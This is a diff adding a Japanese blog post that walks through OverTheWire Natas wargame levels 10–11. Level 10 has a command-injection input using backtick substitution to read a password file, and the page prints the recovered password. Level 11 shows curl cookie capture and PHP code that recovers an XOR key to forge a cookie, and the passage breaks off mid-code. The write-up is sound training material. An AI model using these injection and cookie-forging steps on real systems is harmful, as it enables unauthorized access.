@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="ja">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Level 10  Username: natas10
+URL: http://natas10.natas.labs.overthewire.org
+  Question 
+Answer U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK Answerまでにやったこと View sourcecodeを押すと
+&amp;lt;? $key = &amp;quot;&amp;quot;; if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) { $key = $_REQUEST[&amp;quot;needle&amp;quot;]; } if($key != &amp;quot;&amp;quot;) { if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) { print &amp;quot;Input contains an illegal character!&amp;quot;; } else { passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;); } } ?&amp;gt; preg_match関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずにcat /etc/natas_webpass/natas11をしなくてはなりません。
+ちなみに/[;|&amp;amp;]/は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。
+上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点をgrepに絞ってみました。man grepすると、grepしたいファイルは複数指定できることに気づきました。
+/etc/natas_webpass/natas11の中身で/etc/natas_webpass/natas11をgrepすればいいのではないかとひらめきました。
+・・・何を言っているかわからないとは思いますが、入力値は以下です。
+`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 こう打つとgrepのコマンドは以下のようになります
+grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt cat /etc/natas_webpass/natas11の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。
+ 入力後'><title>【OverTheWire奮闘記】Natas: Level10〜11</title>
+
+<link rel='canonical' href='https://tadakun8.github.io/post/over-the-wire/natas/level10-11/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='【OverTheWire奮闘記】Natas: Level10〜11'>
+<meta property='og:description' content='Level 10  Username: natas10
+URL: http://natas10.natas.labs.overthewire.org
+  Question 
+Answer U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK Answerまでにやったこと View sourcecodeを押すと
+&amp;lt;? $key = &amp;quot;&amp;quot;; if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) { $key = $_REQUEST[&amp;quot;needle&amp;quot;]; } if($key != &amp;quot;&amp;quot;) { if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) { print &amp;quot;Input contains an illegal character!&amp;quot;; } else { passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;); } } ?&amp;gt; preg_match関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずにcat /etc/natas_webpass/natas11をしなくてはなりません。
+ちなみに/[;|&amp;amp;]/は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。
+上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点をgrepに絞ってみました。man grepすると、grepしたいファイルは複数指定できることに気づきました。
+/etc/natas_webpass/natas11の中身で/etc/natas_webpass/natas11をgrepすればいいのではないかとひらめきました。
+・・・何を言っているかわからないとは思いますが、入力値は以下です。
+`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 こう打つとgrepのコマンドは以下のようになります
+grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt cat /etc/natas_webpass/natas11の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。
+ 入力後'>
+<meta property='og:url' content='https://tadakun8.github.io/post/over-the-wire/natas/level10-11/'>
+<meta property='og:site_name' content='ただくんぶろぐ'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-07-06T20:44:23&#43;09:00'/><meta property='article:modified_time' content='2021-07-06T20:44:23&#43;09:00'/>
+<meta name="twitter:title" content="【OverTheWire奮闘記】Natas: Level10〜11">
+<meta name="twitter:description" content="Level 10  Username: natas10
+URL: http://natas10.natas.labs.overthewire.org
+  Question 
+Answer U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK Answerまでにやったこと View sourcecodeを押すと
+&amp;lt;? $key = &amp;quot;&amp;quot;; if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) { $key = $_REQUEST[&amp;quot;needle&amp;quot;]; } if($key != &amp;quot;&amp;quot;) { if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) { print &amp;quot;Input contains an illegal character!&amp;quot;; } else { passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;); } } ?&amp;gt; preg_match関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずにcat /etc/natas_webpass/natas11をしなくてはなりません。
+ちなみに/[;|&amp;amp;]/は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。
+上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点をgrepに絞ってみました。man grepすると、grepしたいファイルは複数指定できることに気づきました。
+/etc/natas_webpass/natas11の中身で/etc/natas_webpass/natas11をgrepすればいいのではないかとひらめきました。
+・・・何を言っているかわからないとは思いますが、入力値は以下です。
+`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 こう打つとgrepのコマンドは以下のようになります
+grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt cat /etc/natas_webpass/natas11の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。
+ 入力後">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://tadakun8.github.io">ただくんぶろぐ</a></h1>
+        <h2 class="site-description">技術ブログはじめました</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://tadakun8.github.io" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/overthewire/" >
+                OverTheWire
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/over-the-wire/natas/level10-11/">【OverTheWire奮闘記】Natas: Level10〜11</a>
+    </h2>
+
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">2021-07-06</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="level-10">Level 10</h2>
+<blockquote>
+<p>Username: natas10<br>
+URL: <a href="http://natas10.natas.labs.overthewire.org">http://natas10.natas.labs.overthewire.org</a></p>
+</blockquote>
+<p><figure style="flex-grow: 193; flex-basis: 465px">
+		<a href="/post/over-the-wire/natas/level10-11/level10/q.png" data-size="2560x1320"><img src="/post/over-the-wire/natas/level10-11/level10/q.png"
+				srcset="/post/over-the-wire/natas/level10-11/level10/q_huc3de3c09b353bba82738ee10424f7bb6_618742_480x0_resize_box_2.png 480w, /post/over-the-wire/natas/level10-11/level10/q_huc3de3c09b353bba82738ee10424f7bb6_618742_1024x0_resize_box_2.png 1024w"
+				width="2560"
+				height="1320"
+				loading="lazy"
+				alt="Question">
+		</a>
+		
+		<figcaption>Question</figcaption>
+		
+	</figure></p>
+<h3 id="answer">Answer</h3>
+<pre><code>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+</code></pre><h3 id="answerまでにやったこと">Answerまでにやったこと</h3>
+<p><code>View sourcecode</code>を押すと</p>
+<pre><code>&lt;?
+$key = &quot;&quot;;
+
+if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
+    $key = $_REQUEST[&quot;needle&quot;];
+}
+
+if($key != &quot;&quot;) {
+    if(preg_match('/[;|&amp;]/',$key)) {
+        print &quot;Input contains an illegal character!&quot;;
+    } else {
+        passthru(&quot;grep -i $key dictionary.txt&quot;);
+    }
+}
+?&gt;
+</code></pre><p><code>preg_match</code>関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずに<code>cat /etc/natas_webpass/natas11</code>をしなくてはなりません。</p>
+<p>ちなみに<code>/[;|&amp;]/</code>は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。</p>
+<p>上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点を<code>grep</code>に絞ってみました。<code>man grep</code>すると、grepしたいファイルは複数指定できることに気づきました。</p>
+<p><code>/etc/natas_webpass/natas11</code>の中身で<code>/etc/natas_webpass/natas11</code>をgrepすればいいのではないかとひらめきました。</p>
+<p>・・・何を言っているかわからないとは思いますが、入力値は以下です。</p>
+<pre><code>`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11
+</code></pre><p>こう打つとgrepのコマンドは以下のようになります</p>
+<pre><code>grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt
+</code></pre><p><code>cat /etc/natas_webpass/natas11</code>の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。</p>
+<p><figure style="flex-grow: 192; flex-basis: 462px">
+		<a href="/post/over-the-wire/natas/level10-11/level10/a.png" data-size="2558x1326"><img src="/post/over-the-wire/natas/level10-11/level10/a.png"
+				srcset="/post/over-the-wire/natas/level10-11/level10/a_hu03c3fcb7a25ec96298a7117d5bb3e5d1_671699_480x0_resize_box_2.png 480w, /post/over-the-wire/natas/level10-11/level10/a_hu03c3fcb7a25ec96298a7117d5bb3e5d1_671699_1024x0_resize_box_2.png 1024w"
+				width="2558"
+				height="1326"
+				loading="lazy"
+				alt="入力後">
+		</a>
+		
+		<figcaption>入力後</figcaption>
+		
+	</figure></p>
+<h2 id="level-11">Level 11</h2>
+<blockquote>
+<p>Username: natas11<br>
+URL: <a href="http://natas11.natas.labs.overthewire.org">http://natas11.natas.labs.overthewire.org</a></p>
+</blockquote>
+<p><figure style="flex-grow: 211; flex-basis: 506px">
+		<a href="/post/over-the-wire/natas/level10-11/level11/q.png" data-size="2560x1212"><img src="/post/over-the-wire/natas/level10-11/level11/q.png"
+				srcset="/post/over-the-wire/natas/level10-11/level11/q_hu075815a10416c6bbcce28688992b09c5_760265_480x0_resize_box_2.png 480w, /post/over-the-wire/natas/level10-11/level11/q_hu075815a10416c6bbcce28688992b09c5_760265_1024x0_resize_box_2.png 1024w"
+				width="2560"
+				height="1212"
+				loading="lazy"
+				alt="Question">
+		</a>
+		
+		<figcaption>Question</figcaption>
+		
+	</figure></p>
+<h3 id="answer-1">Answer</h3>
+<h3 id="answerまでにやったこと-1">Answerまでにやったこと</h3>
+<p><code>View sourcecode</code>を押すと・・・今回は色々と関数が定義されていますね。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span>
+
+<span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;showpassword&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;no&#34;</span><span class="p">,</span> <span class="s2">&#34;bgcolor&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;#ffffff&#34;</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">;</span>
+    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
+    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+    <span class="c1">// Iterate through each character
+</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
+    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">])),</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;showpassword&#34;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;bgcolor&#34;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">];</span>
+        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$mydata</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">saveData</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$d</span><span class="p">))));</span>
+<span class="p">}</span>
+
+<span class="nv">$data</span> <span class="o">=</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;bgcolor&#34;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">saveData</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+
+
+
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">
+</span><span class="err">&lt;h1&gt;natas11&lt;/h1&gt;
+</span><span class="err">&lt;div id=&#34;content&#34;&gt;
+</span><span class="err">&lt;body style=&#34;background: &lt;?=$data[&#39;bgcolor&#39;]?&gt;;&#34;&gt;
+</span><span class="err">Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;
+</span><span class="err">
+</span><span class="err">&lt;?
+</span><span class="err">if($data[&#34;showpassword&#34;] == &#34;yes&#34;) {
+</span><span class="err">    print &#34;The password for natas12 is &lt;censored&gt;&lt;br&gt;&#34;;
+</span><span class="err">}
+</span><span class="err">
+</span><span class="err">?&gt;
+</span><span class="err">
+</span><span class="err">&lt;form&gt;
+</span><span class="err">Background color: &lt;input name=bgcolor value=&#34;&lt;?=$data[&#39;bgcolor&#39;]?&gt;&#34;&gt;
+</span><span class="err">&lt;input type=submit value=&#34;Set color&#34;&gt;
+</span><span class="err">&lt;/form&gt;
+</span></code></pre></div><p>コードを見て以下のことを整理しました</p>
+<ul>
+<li><code>$data[&quot;showpassword&quot;]</code>が<code>yes</code>の時にパスワードが表示される</li>
+<li><code>$data[&quot;showpassword&quot;]</code>は<code>loadData</code>関数で<code>$tempdata['showpassword']</code>の値が代入されている</li>
+<li><code>$tempdata</code>はCookieのdataという値をこねこねしている
+<ul>
+<li><code>$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true)</code></li>
+</ul>
+</li>
+</ul>
+<p>Cookieは<code>saveData</code>で保存されていることがわかるので、Cookieの値を取り出してみます。curlでは<code>-c</code>コマンドの次にパスを指定するとそのファイルにcookie情報が保存されます。</p>
+<pre><code>$ curl -c cookie.txt -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  http://natas11.natas.labs.overthewire.org
+・
+・
+・
+$ cat cookie.txt
+# Netscape HTTP Cookie File
+# https://curl.haxx.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+natas11.natas.labs.overthewire.org      FALSE   /       FALSE   0       data    ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+</code></pre><p>cookie.txtはタブ区切りになっています。どのような情報がタブ区切りになっているかは次のサイトで確認できます。</p>
+<ul>
+<li><a href="https://curl.se/mail/archive-2005-03/0099.html">https://curl.se/mail/archive-2005-03/0099.html</a></li>
+</ul>
+<p>データは<code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D</code>のようです。</p>
+<p>次にこの値を<code>xor_encrypt</code>とは逆のことをしたかったのですが、xor_encryptで定義されている<code>$key</code>の値がわからなかったので途方に暮れました。</p>
+<p>natasに入って初めてですが、回答を見たいと思います。</p>
+<h4 id="回答">回答</h4>
+<p>次のサイトを参考にしました</p>
+<ul>
+<li><a class="link" href="https://www.data-blogger.com/2018/02/23/my-approach-to-natas-level-11-a-web-security-game/"  target="_blank" rel="noopener"
+    >My Approach to Natas Level 11 (a Web Security Game)</a></li>
+<li><a class="link" href="https://www.abatchy.com/2016/11/natas-level-11"  target="_blank" rel="noopener"
+    >OverTheWire: Natas 11</a></li>
+</ul>
+<p>xorの性質として以下のことが成り立ちます</p>
+<ul>
+<li><code>plaintext XOR key = cyphertext</code></li>
+<li><code>plaintext XOR cyphertext = key</code></li>
+</ul>
+<p>keyを求めるために以下のphpコマンドを打ちました。回答に従って、phpのインタラクティブシェルを<code>php -a</code>で起動して実行します</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// Just the same XOR encrypt code as found in the script but using $key as an argument so we can modify that
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
+    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+    <span class="c1">// Iterate through each character
+</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Get the encrypted default, make sure to peel of the base64 encrypted layer
+</span><span class="c1"></span><span class="nv">$enc_defaults</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&#34;</span><span class="p">);</span>
+<span class="c1">// The defaults as found in the script
+</span><span class="c1"></span><span class="nv">$defaults</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;showpassword&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;no&#34;</span><span class="p">,</span> <span class="s2">&#34;bgcolor&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;#ffffff&#34;</span><span class="p">));</span>
+
+<span class="c1">// Obtain the key by abusing the properties of the XOR encryption
+</span><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$enc_defaults</span><span class="p">,</span> <span class="nv">$defaults</span><span class="p">);</span>
+
+<span class="c1">// Display the result
+</span><span class="c1"></span><span class="k">echo</span> <span class="nv">$key</span><span class="p">;</span>
+</code></pre></div><p>そうすると</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$key</span><span class="p">;</span>
+<span class="nx">qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span>
+</code></pre></div><p><code>qw8J</code>の繰り返しの文が出てきました。</p>
+<p>この意味としては</p>
+<blockquote>
+<p>The key equals qw8J. One property of the XOR encryption is that the key often is repeated</p>
+</blockquote>
+<p>XOR暗号化ではキーが繰り返されるみたいです。それは<code>$outText .= $text[$i] ^ $key[$i % strlen($key)];</code>ここでもわかります。</p>
+<p>キーがわかったので<code>$data['showpassword']</code>が<code>yes</code>になっている連想配列をXORしてCookieの値を更新してみましょう。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// Now by using the key we just found we can create a modified version of the defaults
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
+    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+    <span class="c1">// Iterate through each character
+</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
+    <span class="p">}</span>
+
